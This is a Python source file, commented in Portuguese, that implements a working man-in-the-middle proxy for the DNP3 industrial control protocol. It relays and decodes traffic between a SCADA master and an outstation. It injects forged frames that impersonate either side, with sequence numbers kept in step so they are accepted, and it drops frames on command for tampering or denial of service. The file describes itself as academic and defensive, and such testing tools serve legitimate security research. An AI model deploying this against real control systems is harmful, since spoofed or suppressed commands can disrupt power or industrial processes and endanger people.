"""
Proxy MITM (on-path) para DNP3 (IEEE 1815-2012).

O atacante fica FORA da conversa, entre o master e o outstation reais:

    master  ──►  [ proxy :20000 ]  ──►  outstation real :20001
            ◄──                    ◄──

O proxy escuta onde o master espera o outstation (20000), conecta ao outstation
real (20001) e repassa os dois sentidos. De um console, o atacante pode:
  - OBSERVAR toda a conversa (frames decodificados, nos dois sentidos);
  - INJETAR frames maliciosos  → outstation (como se fosse o master);
  - INJETAR frames maliciosos  → master     (como se fosse o outstation);
  - DESCARTAR frames em transito (tamper / DoS seletivo).

Mesmo modelo do proxy IEC 104 (iec104_mitm.py), adaptado as tres camadas do DNP3.
Uso academico/defensivo.
"""

import asyncio
import logging
from typing import Optional

from ..protocols.dnp3.frames import DNP3Codec, frame_label
from .dnp3_lib import DNP3AttackSession, _fmt_hex

logger = logging.getLogger("scada_trafgen.dnp3.mitm")

# Cores ANSI
DIM = "\033[90m"; RESET = "\033[0m"; BOLD = "\033[1m"
RED = "\033[31m"; GRN = "\033[32m"; YEL = "\033[33m"; CYA = "\033[36m"; MAG = "\033[35m"


class DNP3Mitm:
    """Proxy transparente DNP3 com injecao e descarte por sentido."""

    def __init__(self, listen_host="127.0.0.1", listen_port=20000,
                 outstation_host="127.0.0.1", outstation_port=20001,
                 transparent=False):
        self.listen_host = listen_host
        self.listen_port = listen_port
        self.outstation_host = outstation_host
        self.outstation_port = outstation_port
        # Modo transparente: upstream descoberto por SO_ORIGINAL_DST por conexao.
        self.transparent = transparent

        self.master_writer: Optional[asyncio.StreamWriter] = None
        self.outstation_writer: Optional[asyncio.StreamWriter] = None
        self._connected = False

        self.observe = False
        self.drop = {"to-outstation": 0, "to-master": 0}

        # Construtores de frame (nao abrem socket): um para impersonar o master
        # (frames -> outstation) e outro para impersonar o outstation (-> master).
        # As sequencias (app/transport) sao sincronizadas com o que passa na linha.
        self.as_master = DNP3AttackSession()       # injeta -> outstation
        self.as_outstation = DNP3AttackSession()   # injeta -> master
        self.server: Optional[asyncio.AbstractServer] = None
        self._stop = asyncio.Event()

    # ------------------------------------------------------------------
    # Proxy
    # ------------------------------------------------------------------
    async def _handle_master(self, m_reader, m_writer):
        peer = m_writer.get_extra_info("peername")
        ohost, oport = self.outstation_host, self.outstation_port
        if self.transparent:
            from .transparent import original_dst
            dst = original_dst(m_writer)
            if dst:
                ohost, oport = dst      # IP:porta do outstation real (SO_ORIGINAL_DST)
            else:
                print(f"{RED}[!] transparente: SO_ORIGINAL_DST indisponivel; "
                      f"usando {ohost}:{oport}{RESET}")
        print(f"\n{GRN}[+] master conectou de {peer}; abrindo upstream para "
              f"o outstation {ohost}:{oport}{RESET}")
        try:
            o_reader, o_writer = await asyncio.open_connection(ohost, oport)
        except OSError as e:
            print(f"{RED}[!] falha ao conectar no outstation real: {e}{RESET}")
            m_writer.close()
            return

        self.master_writer = m_writer
        self.outstation_writer = o_writer
        self._connected = True
        print(f"{GRN}[+] MITM ativo: master <-> proxy <-> outstation{RESET}\n")

        pump_mo = asyncio.create_task(self._pump(m_reader, o_writer, "to-outstation"))
        pump_om = asyncio.create_task(self._pump(o_reader, m_writer, "to-master"))
        try:
            await asyncio.wait([pump_mo, pump_om],
                               return_when=asyncio.FIRST_COMPLETED)
        finally:
            for t in (pump_mo, pump_om):
                t.cancel()
            await asyncio.gather(pump_mo, pump_om, return_exceptions=True)
            self._connected = False
            for w in (m_writer, o_writer):
                try:
                    w.close()
                except OSError:
                    pass
            print(f"\n{YEL}[-] conexao encerrada; MITM em espera{RESET}")

    async def _pump(self, reader, writer, direction: str):
        """Repassa frame a frame de um lado ao outro, observando e permitindo drop."""
        buf = b""
        while not self._stop.is_set():
            try:
                data = await reader.read(4096)
            except (ConnectionError, OSError):
                break
            if not data:
                break
            buf += data
            while True:
                frame, buf = DNP3Codec.read_frame_from_buffer(buf)
                if frame is None:
                    break
                self._track(frame, direction)
                if self.observe:
                    self._print_frame(frame, direction, injected=False)
                if self.drop[direction] > 0:
                    self.drop[direction] -= 1
                    print(f"{RED}[drop {direction}] frame descartado "
                          f"({_fmt_hex(frame)[:23]}...){RESET}")
                    continue
                try:
                    writer.write(frame)
                    await writer.drain()
                except (ConnectionError, OSError):
                    return

    def _track(self, frame: bytes, direction: str):
        """Sincroniza as sequencias (app/transport) dos construtores com a linha."""
        link = DNP3Codec.decode_link_frame(frame)
        if not link or link.get("crc_error") or not link.get("payload"):
            return
        tr = DNP3Codec.decode_transport(link["payload"])
        app = DNP3Codec.decode_app(tr["data"]) if tr.get("data") else None
        b = self.as_master if direction == "to-outstation" else self.as_outstation
        b._transport_seq = (tr["seq"] + 1) % 64
        if app:
            b._app_seq = app["seq"]

    # ------------------------------------------------------------------
    # Injecao
    # ------------------------------------------------------------------
    async def inject(self, frame: bytes, target: str):
        """Escreve um frame diretamente no destino (master ou outstation)."""
        writer = (self.outstation_writer if target == "to-outstation"
                  else self.master_writer)
        if writer is None or writer.is_closing():
            print(f"{RED}[!] sem conexao ativa para injetar ({target}){RESET}")
            return
        try:
            writer.write(frame)
            await writer.drain()
        except (ConnectionError, OSError) as e:
            print(f"{RED}[!] falha ao injetar: {e}{RESET}")
            return
        self._print_frame(frame, target, injected=True)

    # ------------------------------------------------------------------
    # Impressao
    # ------------------------------------------------------------------
    def _decode_label(self, frame: bytes) -> dict:
        link = DNP3Codec.decode_link_frame(frame)
        if not link:
            return {"name": "?", "ftype": "?"}
        if link.get("crc_error"):
            return frame_label(None, link)
        tr = DNP3Codec.decode_transport(link.get("payload", b''))
        app = DNP3Codec.decode_app(tr["data"]) if tr.get("data") else None
        return frame_label(app, link)

    def _print_frame(self, frame: bytes, direction: str, injected: bool):
        lbl = self._decode_label(frame)
        arrow = ("──► outstation" if direction == "to-outstation"
                 else "──► master")
        extra = ""
        if lbl.get("cot"):
            extra = f" [{lbl['cot']}]"
        if injected:
            tag = f"{MAG}{BOLD}[INJETADO {arrow}]{RESET}"
        else:
            col = CYA if direction == "to-master" else DIM
            tag = f"{col}[{arrow}]{RESET}"
        print(f"  {tag} {lbl['name']}{extra}  {DIM}{_fmt_hex(frame)[:35]}{RESET}")

    def status(self):
        st = f"{GRN}ativo{RESET}" if self._connected else f"{YEL}em espera{RESET}"
        print(f"  MITM DNP3 {st} | proxy :{self.listen_port} -> outstation "
              f"{self.outstation_host}:{self.outstation_port}")
        print(f"  observe={'on' if self.observe else 'off'} | "
              f"drop to-outstation={self.drop['to-outstation']} "
              f"to-master={self.drop['to-master']}")
        print(f"  seq observado: master app~{self.as_master._app_seq} "
              f"tr~{self.as_master._transport_seq} | "
              f"outstation app~{self.as_outstation._app_seq} "
              f"tr~{self.as_outstation._transport_seq}")

    # ------------------------------------------------------------------
    # Ciclo de vida
    # ------------------------------------------------------------------
    async def serve(self):
        self.server = await asyncio.start_server(
            self._handle_master, self.listen_host, self.listen_port)
        print(f"{GRN}Proxy MITM DNP3 ouvindo em {self.listen_host}:{self.listen_port}"
              f"{RESET}  (repassando para o outstation "
              f"{self.outstation_host}:{self.outstation_port})")
        async with self.server:
            await self.server.serve_forever()

    async def shutdown(self):
        self._stop.set()
        if self.server:
            self.server.close()
